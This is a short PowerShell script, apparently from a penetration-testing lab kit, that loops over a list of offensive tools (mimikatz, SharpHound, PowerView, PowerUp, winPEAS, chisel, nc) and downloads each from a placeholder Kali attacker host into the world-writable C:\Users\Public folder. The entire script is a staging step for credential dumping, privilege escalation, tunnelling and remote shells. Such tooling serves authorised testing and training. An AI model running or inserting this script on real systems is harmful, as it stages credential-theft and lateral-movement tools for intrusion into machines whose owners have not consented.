# Edit for your kali IP address and port serving the tools for download
$baseUrl = "http://KALI_IP:port/"
$fileNames = @("SharpHound.ps1", "powerup.ps1", "powerview.ps1", "mimikatz.exe", "winPEASx86.exe", "chisel64.exe", "nc.exe")
# $downloadPath = "C:\Windows\Tasks"
$downloadPath = "C:\Users\Public"

foreach ($fileName in $fileNames) {
	$url = $baseUrl + $fileName
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest -Uri $url -OutFile $filePath
	Write-host "Downloaded $fileName to $filePath"
}
